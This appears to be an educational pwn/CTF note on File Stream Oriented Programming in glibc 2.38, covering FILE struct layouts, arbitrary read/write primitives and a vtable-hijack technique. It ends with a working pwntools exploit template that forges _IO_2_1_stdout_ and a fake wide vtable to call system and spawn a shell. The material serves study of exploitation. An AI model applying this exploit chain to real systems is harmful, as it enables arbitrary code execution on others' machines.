# File Stream Oriented Programming (FSOP)

<div class="hidden">
    <details>
        <summary>Keywords</summary>
        fsop, pwn, aaw, aar, arbitrary address write, arbitrary address read, primitive
    </details>
</div>

> [!NOTE]
> Some lines of code are hidden for brevity.
> 
> When hovering over the code block, press the eye button on the top right corner
> to toggle the hidden lines.


## Built-in File Struct

### `struct _IO_FILE`

<https://elixir.bootlin.com/glibc/glibc-2.38/source/libio/bits/types/struct_FILE.h#L49>

```c
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;

  /* The following fields only exist if `_IO_USE_OLD_IO_FILE` is not defined */
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```

`_IO_FILE` field offsets

```console
gef> ptype /ox struct _IO_FILE
/* offset      |    size */  type = struct _IO_FILE {
/* 0x0000      |  0x0004 */    int _flags;
/* XXX  4-byte hole      */
/* 0x0008      |  0x0008 */    char *_IO_read_ptr;
/* 0x0010      |  0x0008 */    char *_IO_read_end;
/* 0x0018      |  0x0008 */    char *_IO_read_base;
/* 0x0020      |  0x0008 */    char *_IO_write_base;
/* 0x0028      |  0x0008 */    char *_IO_write_ptr;
/* 0x0030      |  0x0008 */    char *_IO_write_end;
/* 0x0038      |  0x0008 */    char *_IO_buf_base;
/* 0x0040      |  0x0008 */    char *_IO_buf_end;
/* 0x0048      |  0x0008 */    char *_IO_save_base;
/* 0x0050      |  0x0008 */    char *_IO_backup_base;
/* 0x0058      |  0x0008 */    char *_IO_save_end;
/* 0x0060      |  0x0008 */    struct _IO_marker *_markers;
/* 0x0068      |  0x0008 */    struct _IO_FILE *_chain;
/* 0x0070      |  0x0004 */    int _fileno;
/* 0x0074      |  0x0004 */    int _flags2;
/* 0x0078      |  0x0008 */    __off_t _old_offset;
/* 0x0080      |  0x0002 */    unsigned short _cur_column;
/* 0x0082      |  0x0001 */    signed char _vtable_offset;
/* 0x0083      |  0x0001 */    char _shortbuf[1];
/* XXX  4-byte hole      */
/* 0x0088      |  0x0008 */    _IO_lock_t *_lock;
/* 0x0090      |  0x0008 */    __off64_t _offset;
/* 0x0098      |  0x0008 */    struct _IO_codecvt *_codecvt;
/* 0x00a0      |  0x0008 */    struct _IO_wide_data *_wide_data;
/* 0x00a8      |  0x0008 */    struct _IO_FILE *_freeres_list;
/* 0x00b0      |  0x0008 */    void *_freeres_buf;
/* 0x00b8      |  0x0008 */    size_t __pad5;
/* 0x00c0      |  0x0004 */    int _mode;
/* 0x00c4      |  0x0014 */    char _unused2[20];

                               /* total size (bytes):  216 */
                             }
```

#### _flags

<https://elixir.bootlin.com/glibc/glibc-2.38/source/libio/libio.h#L66>

```c
#define _IO_MAGIC         0xFBAD0000 /* Magic number */
#define _IO_MAGIC_MASK    0xFFFF0000
#define _IO_USER_BUF          0x0001 /* Don't deallocate buffer on close. */
#define _IO_UNBUFFERED        0x0002
#define _IO_NO_READS          0x0004 /* Reading not allowed.  */
#define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */
#define _IO_EOF_SEEN          0x0010
#define _IO_ERR_SEEN          0x0020
#define _IO_DELETE_DONT_CLOSE 0x0040 /* Don't call close(_fileno) on close.  */
#define _IO_LINKED            0x0080 /* In the list of all open files.  */
#define _IO_IN_BACKUP         0x0100
#define _IO_LINE_BUF          0x0200
#define _IO_TIED_PUT_GET      0x0400 /* Put and get pointer move in unison.  */
#define _IO_CURRENTLY_PUTTING 0x0800
#define _IO_IS_APPENDING      0x1000
#define _IO_IS_FILEBUF        0x2000
                           /* 0x4000  No longer used, reserved for compat.  */
#define _IO_USER_LOCK         0x8000
```

### `struct _IO_FILE_plus`

<https://elixir.bootlin.com/glibc/glibc-2.38/source/libio/libioP.h#L325>

```c
typedef struct _IO_FILE FILE;

struct _IO_FILE_plus
{
  FILE file;
  const struct _IO_jump_t *vtable;
};
```

`_IO_FILE_plus` field offsets

```console
gef> ptype /ox struct _IO_FILE_plus
/* offset      |    size */  type = struct _IO_FILE_plus {
/* 0x0000      |  0x00d8 */    FILE file;
/* 0x00d8      |  0x0008 */    const struct _IO_jump_t *vtable;

                               /* total size (bytes):  224 */
                             }
```

Usage on glibc stdio

```c
extern struct _IO_FILE_plus _IO_2_1_stdin_;
extern struct _IO_FILE_plus _IO_2_1_stdout_;
extern struct _IO_FILE_plus _IO_2_1_stderr_;
```

#### `struct _IO_jump_t`

- <https://elixir.bootlin.com/glibc/glibc-2.38/source/libio/libioP.h#L294>
- <https://elixir.bootlin.com/glibc/glibc-2.38/source/libio/vtables.c#L91>

```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```

`_IO_jump_t` field offsets

```console
gef> ptype /ox struct _IO_jump_t
/* offset      |    size */  type = struct _IO_jump_t {
/* 0x0000      |  0x0008 */    size_t __dummy;
/* 0x0008      |  0x0008 */    size_t __dummy2;
/* 0x0010      |  0x0008 */    _IO_finish_t __finish;
/* 0x0018      |  0x0008 */    _IO_overflow_t __overflow;
/* 0x0020      |  0x0008 */    _IO_underflow_t __underflow;
/* 0x0028      |  0x0008 */    _IO_underflow_t __uflow;
/* 0x0030      |  0x0008 */    _IO_pbackfail_t __pbackfail;
/* 0x0038      |  0x0008 */    _IO_xsputn_t __xsputn;
/* 0x0040      |  0x0008 */    _IO_xsgetn_t __xsgetn;
/* 0x0048      |  0x0008 */    _IO_seekoff_t __seekoff;
/* 0x0050      |  0x0008 */    _IO_seekpos_t __seekpos;
/* 0x0058      |  0x0008 */    _IO_setbuf_t __setbuf;
/* 0x0060      |  0x0008 */    _IO_sync_t __sync;
/* 0x0068      |  0x0008 */    _IO_doallocate_t __doallocate;
/* 0x0070      |  0x0008 */    _IO_read_t __read;
/* 0x0078      |  0x0008 */    _IO_write_t __write;
/* 0x0080      |  0x0008 */    _IO_seek_t __seek;
/* 0x0088      |  0x0008 */    _IO_close_t __close;
/* 0x0090      |  0x0008 */    _IO_stat_t __stat;
/* 0x0098      |  0x0008 */    _IO_showmanyc_t __showmanyc;
/* 0x00a0      |  0x0008 */    _IO_imbue_t __imbue;

                               /* total size (bytes):  168 */
                             }
```

### List of `vtables`

<https://elixir.bootlin.com/glibc/glibc-2.38/source/libio/libioP.h#L509>

> [!NOTE]
> - glibc stdio uses `_IO_file_jumps` vtable
> - `_wide_data` struct uses `_IO_wfile_jumps` vtable

```c
extern const struct _IO_jump_t __io_vtables[] attribute_hidden;
#define _IO_str_jumps                    (__io_vtables[IO_STR_JUMPS])
#define _IO_wstr_jumps                   (__io_vtables[IO_WSTR_JUMPS])
#define _IO_file_jumps                   (__io_vtables[IO_FILE_JUMPS])
#define _IO_file_jumps_mmap              (__io_vtables[IO_FILE_JUMPS_MMAP])
#define _IO_file_jumps_maybe_mmap        (__io_vtables[IO_FILE_JUMPS_MAYBE_MMAP])
#define _IO_wfile_jumps                  (__io_vtables[IO_WFILE_JUMPS])
#define _IO_wfile_jumps_mmap             (__io_vtables[IO_WFILE_JUMPS_MMAP])
#define _IO_wfile_jumps_maybe_mmap       (__io_vtables[IO_WFILE_JUMPS_MAYBE_MMAP])
#define _IO_cookie_jumps                 (__io_vtables[IO_COOKIE_JUMPS])
#define _IO_proc_jumps                   (__io_vtables[IO_PROC_JUMPS])
#define _IO_mem_jumps                    (__io_vtables[IO_MEM_JUMPS])
#define _IO_wmem_jumps                   (__io_vtables[IO_WMEM_JUMPS])
#define _IO_printf_buffer_as_file_jumps  (__io_vtables[IO_PRINTF_BUFFER_AS_FILE_JUMPS])
#define _IO_wprintf_buffer_as_file_jumps (__io_vtables[IO_WPRINTF_BUFFER_AS_FILE_JUMPS])
#define _IO_old_file_jumps               (__io_vtables[IO_OLD_FILE_JUMPS])
#define _IO_old_proc_jumps               (__io_vtables[IO_OLD_PROC_JUMPS])
#define _IO_old_cookie_jumps             (__io_vtables[IO_OLD_COOKIED_JUMPS])
```

## Arbitrary Address Write

- Human language:
    - the ability to write anywhere on the memory
    - read file content then write to memory (`fread`)
    - reading data **into** memory
- `C` language:
    - `read(fd, buf, size);`
    - `fread(buf, size, nmemb, fp)`

Requirements:
- `_flags & _IO_NO_READS (0x4) == 0`[^no-read]
- `_IO_read_ptr == _IO_read_end`
- `_IO_buf_base` is set to the starting address to write into
- `_IO_buf_end` is set to the end address (starting address + number of bytes to be written into)
- `_IO_fileno` is set to the source of data file descriptor , usually `0` (`STDIN_FILENO`)

#### Example

Example using [`pwntools`](https://docs.pwntools.com/en/stable/filepointer.html#module-pwnlib.filepointer)
to setup for writing `nb` number of bytes into address `target_address`

```py
from pwn import *

target_address = 0x1337
nb = 0x100
fs = FileStructure()
# flags taken from unbuffered _IO_2_1_stdin_, but most importantly 0xfbad208b & _IO_NO_READS == 0
fs.flags = 0xfbad208b
fs._IO_buf_base = target_address
fs._IO_buf_end = target_address + nb
fs._fileno = 1  # STDOUT_FILENO
payload = bytes(fs)  # payload to overwrite the whole field of _IO_FILE_plus struct
payload = fs.struntil("_fileno")  # payload to overwrite until _fileno

# Alternative way to automatically set the required fields and .struntil("_fileno")
payload = FileStructure().read(addr=target_address, size=nb)
```

[^no-read]: Default for `fopen(filepath, "r")` or achievable by `_flag & (~_IO_NO_READS)`

## Arbitrary Address Read

- Human language:
    - the ability to read any data from memory (leak memory)
    - read from memory then write to file (`fwrite`)
    - reading data **from** memory
- `C` language:
    - `write(fd, buf, size);`
    - `fwrite(buf, size, nmemb, fp)`

Requirements:
- `_flags & _IO_NO_WRITES (0x8) == 0`[^no-write]
- `_flags & _IO_UNBUFFERED (0x2) == 1` (not necessary, but desirable in most cases)
- `_IO_read_end == _IO_write_base`
- `_IO_write_base` is set to the starting address to read from
- `_IO_write_ptr` is set to the end address (starting address + number of bytes to be read from)
- `_IO_fileno` is set to the file descriptor where the read data is written into, usually `1` (`STDOUT_FILENO`)

#### Example

Example using [`pwntools`](https://docs.pwntools.com/en/stable/filepointer.html#module-pwnlib.filepointer)
to setup for reading `nb` number of bytes from address `target_address`

```py
from pwn import *

target_address = 0x1337
nb = 0x100
fs = FileStructure()
# flags taken from unbuffered _IO_2_1_stdout_, but most importantly 0xfbad2887 & _IO_NO_WRITES == 0
fs.flags = 0xfbad2887
fs._IO_write_base = target_address
fs._IO_write_ptr = target_address + nb
fs._fileno = 1  # STDOUT_FILENO
payload = bytes(fs)  # payload to overwrite the whole field of _IO_FILE_plus struct
payload = fs.struntil("_fileno")  # payload to overwrite until _fileno

# Alternative way to automatically set the required fields and .struntil("_fileno")
payload = FileStructure().write(addr=target_address, size=nb) # 
```

[^no-write]: Default for `fopen(filepath, "w")` or achievable by `_flag & (~_IO_NO_WRITES)` (`_IO_NO_WRITES = 0x8`)

## Overwriting `vtable` Exploit

### Abusing `fwrite` & `glibc _IO_2_1_stdout_`

`fwrite` calls `_IO_sputn` which is the function at offset `0x38` inside the vtable.
Hence, when overwriting the vtable field to point to our fake vtable, for example
at address `0x13370000`, the target functon needs to be located at `0x13370038`.

```c
// https://elixir.bootlin.com/glibc/glibc-2.38/source/libio/libioP.h#L177
#define _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)

// https://elixir.bootlin.com/glibc/glibc-2.38/source/libio/libioP.h#L380
#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)

// https://elixir.bootlin.com/glibc/glibc-2.38/source/libio/iofwrite.c#L30
size_t
_IO_fwrite (const void *buf, size_t size, size_t count, FILE *fp)
{
  size_t request = size * count;
  size_t written = 0;
  CHECK_FILE (fp, 0);
  if (request == 0)
    return 0;
  _IO_acquire_lock (fp);
  if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)
    written = _IO_sputn (fp, (const char *) buf, request); // calls _IO_sputn
  _IO_release_lock (fp);
  /* We have written all of the input in case the return value indicates
     this or EOF is returned.  The latter is a special case where we
     simply did not manage to flush the buffer.  But the data is in the
     buffer and therefore written as far as fwrite is concerned.  */
  if (written == request || written == EOF)
    return count;
  else
    return written / size;
}
```

Cross check using disassembler

```console
gef> disass fwrite
Dump of assembler code for function __GI__IO_fwrite:
   [snip]
   0x00007ffff7e12f4d <+45>:    mov    rbx,rcx  # rcx (the 4th argument in x64 calling convention) is FILE *fp
   [snip]
   0x00007ffff7e12fa3 <+131>:   mov    r15,QWORD PTR [rbx+0xd8]  # 0xd8 is offset to the vtable field
   [snip]
   0x00007ffff7e12fd3 <+179>:   call   QWORD PTR [r15+0x38]  # calls the function at offset 0x38 inside the vtable, which is __xsputn
   [snip]
gef> p (char *)&_IO_2_1_stdout_ + 0xd8
$1 = 0x7ffff7fad858 <_IO_2_1_stdout_+216> ""
gef> p &_IO_2_1_stdout_.vtable
$2 = (const struct _IO_jump_t **) 0x7ffff7fad858 <_IO_2_1_stdout_+216>
gef> tele _IO_2_1_stdout_.vtable 8
0x7ffff7fa9600|+0x0000|+000: 0x0000000000000000  <-  $rbp
0x7ffff7fa9608|+0x0008|+001: 0x0000000000000000
0x7ffff7fa9610|+0x0010|+002: 0x00007ffff7e1eff0 <_IO_new_file_finish>  ->  0xfd894855fa1e0ff3
0x7ffff7fa9618|+0x0018|+003: 0x00007ffff7e1fdc0 <_IO_new_file_overflow>  ->  0x48555441fa1e0ff3
0x7ffff7fa9620|+0x0020|+004: 0x00007ffff7e1fab0 <_IO_new_file_underflow>  ->  0x10a8078bfa1e0ff3
0x7ffff7fa9628|+0x0028|+005: 0x00007ffff7e20d60 <__GI__IO_default_uflow>  ->  0x158d4855fa1e0ff3
0x7ffff7fa9630|+0x0030|+006: 0x00007ffff7e22280 <__GI__IO_default_pbackfail>  ->  0x56415741fa1e0ff3
0x7ffff7fa9638|+0x0038|+007: 0x00007ffff7e1e600 <_IO_new_file_xsputn>  ->  0x56415741fa1e0ff3
```

Since glibc 2.24, there is a [vtable pointer validation check](https://elixir.bootlin.com/glibc/glibc-2.38/source/libio/libioP.h#L1022).
This validation prevents us from modifying the vtable pointer to point outside
the vtables region. Fortunately, there is no validation for `_wide_data` vtable
pointer, `_wide_vtable`.

For this `_wide_vtable` to be used, we would need to get `fwrite` to call `_IO_wfile_overflow` instead of `__xsputn`
which would then call `_IO_wdoallocbuf` and finally a function inside `_wide_vtable`.

```c
struct _IO_FILE
{
  // snip for brevity
/* offset      |    size */
/* 0x00a0      |  0x0008 */    struct _IO_wide_data *_wide_data;
  // snip for brevity
};


struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of
				   backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};
```

`_IO_wide_data` field offsets

```console
gef> ptype /ox struct _IO_wide_data
/* offset      |    size */  type = struct _IO_wide_data {
/* 0x0000      |  0x0008 */    wchar_t *_IO_read_ptr;
/* 0x0008      |  0x0008 */    wchar_t *_IO_read_end;
/* 0x0010      |  0x0008 */    wchar_t *_IO_read_base;
/* 0x0018      |  0x0008 */    wchar_t *_IO_write_base;
/* 0x0020      |  0x0008 */    wchar_t *_IO_write_ptr;
/* 0x0028      |  0x0008 */    wchar_t *_IO_write_end;
/* 0x0030      |  0x0008 */    wchar_t *_IO_buf_base;
/* 0x0038      |  0x0008 */    wchar_t *_IO_buf_end;
/* 0x0040      |  0x0008 */    wchar_t *_IO_save_base;
/* 0x0048      |  0x0008 */    wchar_t *_IO_backup_base;
/* 0x0050      |  0x0008 */    wchar_t *_IO_save_end;
/* 0x0058      |  0x0008 */    __mbstate_t _IO_state;
/* 0x0060      |  0x0008 */    __mbstate_t _IO_last_state;
/* 0x0068      |  0x0070 */    struct _IO_codecvt {
/* 0x0068      |  0x0038 */        _IO_iconv_t __cd_in;
/* 0x00a0      |  0x0038 */        _IO_iconv_t __cd_out;

                                   /* total size (bytes):  112 */
                               } _codecvt;
/* 0x00d8      |  0x0004 */    wchar_t _shortbuf[1];
/* XXX  4-byte hole      */
/* 0x00e0      |  0x0008 */    const struct _IO_jump_t *_wide_vtable;

                               /* total size (bytes):  232 */
                             }
```

To successfuly get `_IO_wfile_overflow` to use our fake wide vtable, we need to
satisfy several conditions.
- As seen from the code snippet below, `fp->_wide_data->_IO_write_base` needs to be `NULL`
- Inside `_IO_wdoallocbuf`, there is a check similar like this:
    ```c
    if (f->_wide_data->_IO_buf_base) {
        _IO_wfile_doallocate (f); // wide vtable function at offset 0x68
    }
    ```

If we overwrite `_wide_vtable+0x68` to be the address of `system()`, we could
see that it will invoke system like so, `system(f)`, where `f` is the file struct
that we corrupted. In other words, the argument passed to `system()` would be
the value of the `_flags` field. Through trial-and-error, I found out that
setting `_flags = 0x68736162`, which is just `bash` does not work as throughout
the process, this value is changed and when it reaches vtable function invocation,
it is no longer `system("bash")`. The working solution is to call `system("dash")`.

```c
// https://elixir.bootlin.com/glibc/glibc-2.38/source/libio/wfileops.c#L406
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0  // shouldn't be an issue since the second condition can be easily satisfied and needs to be satisfied
      || f->_wide_data->_IO_write_base == NULL)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
	{
	  _IO_wdoallocbuf (f);
	  _IO_free_wbackup_area (f);
	  _IO_wsetg (f, f->_wide_data->_IO_buf_base,
		     f->_wide_data->_IO_buf_base, f->_wide_data->_IO_buf_base);

	  if (f->_IO_write_base == NULL)
	    {
	      _IO_doallocbuf (f);
	      _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
	    }
	}
    // snip for brevity
    }
    // snip for brevity
}
```

```console
gef> disass _IO_wfile_overflow
   [snip]
   0x00007ffff7e195f0 <+608>:   call   0x7ffff7e16b70 <__GI__IO_wdoallocbuf>
   [snip]

gef> disass _IO_wdoallocbuf
Dump of assembler code for function __GI__IO_wdoallocbuf:
   0x00007ffff7e16b70 <+0>:     endbr64
   0x00007ffff7e16b74 <+4>:     mov    rax,QWORD PTR [rdi+0xa0]  # rax = fp->_wide_data
   0x00007ffff7e16b7b <+11>:    cmp    QWORD PTR [rax+0x30],0x0  # checks if fp->_wide_data->_IO_buf_base is NULL
   0x00007ffff7e16b80 <+16>:    je     0x7ffff7e16b88 <__GI__IO_wdoallocbuf+24>
   0x00007ffff7e16b82 <+18>:    ret
   0x00007ffff7e16b83 <+19>:    nop    DWORD PTR [rax+rax*1+0x0]
   0x00007ffff7e16b88 <+24>:    push   r12
   0x00007ffff7e16b8a <+26>:    push   rbp
   0x00007ffff7e16b8b <+27>:    push   rbx
   0x00007ffff7e16b8c <+28>:    mov    rbx,rdi
   0x00007ffff7e16b8f <+31>:    test   BYTE PTR [rdi],0x2
   0x00007ffff7e16b92 <+34>:    jne    0x7ffff7e16c08 <__GI__IO_wdoallocbuf+152>
   0x00007ffff7e16b94 <+36>:    mov    rax,QWORD PTR [rax+0xe0]  # rax = fp->_wide_data->_wide_vtable
   0x00007ffff7e16b9b <+43>:    call   QWORD PTR [rax+0x68]  # calls function at offset 0x68 inside the _wide_vtable (of kind __doallocate, specifically _IO_wfile_doallocate since we are dealing with wide data)
```

> [!WARNING]
> Be careful when overwriting the `_IO_lock_t *_lock` field.
> The value needs to be a writable address that has NULL value

#### Example

Here is an example using `pwntools`

```py
from pwn import *

elf = context.binary = ELF("/path/to/binary", checksec=False)
libc = elf.libc

def start(argv=[], *a, **kw):
    nc = "nc localhost 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


def aaw(addr, data):
    # Helper function to perform arbitrary address write
    pass


def aar(addr, data):
    # Helper function to perform arbitrary address write
    pass

env = {}
io = start()

fake_wide_vtable = elf.bss(0x400)
# Create overlapping fake _IO_wide_data struct and fake _wide_vtable @ bss+0x400
payload = b""
# doing this ensures both fp->_wide_data->_IO_write_base and
# fp->_wide_data->_IO_buf_base is set to NULL
payload = payload.ljust(0x68, b"\x00")
payload += p64(libc.sym["system"])  # _wide_vtable+0x68, which is also fp->_wide_data->_codecvt
payload = payload.ljust(0xe0, b"\x00")
payload += p64(fake_wide_vtable)  # fp->_wide_data->_wide_vtable

aaw(fake_wide_vtable, payload)

# Overwrite _IO_2_1_stdout_ vtable to call _IO_wfile_overflow
fs = FileStructure()
fs.flags = u32(b"dash")
fs.fileno = 1
fs._lock = libc.sym["_IO_stdfile_1_lock"]
fs._wide_data = fake_wide_vtable
# 0x38 is the function offset inside vtable
# 0x18 is __overflow offset for _IO_jump_t
fs.vtable = libc.sym["_IO_wfile_jumps"] - 0x38 + 0x18
payload = bytes(fs)
aaw(libc.sym["_IO_2_1_stdout_"], payload)

io.interactive()
```

## References

- <https://pwn.college/software-exploitation/file-struct-exploits>
- <https://github.com/un1c0rn-the-pwnie/FSOPAgain>
- <https://faraz.faith/2020-10-13-FSOP-lazynote/>
- <https://niftic.ca/posts/fsop/#known-exploitation-techniques>
- <https://docs.pwntools.com/en/stable/filepointer.html#module-pwnlib.filepointer>
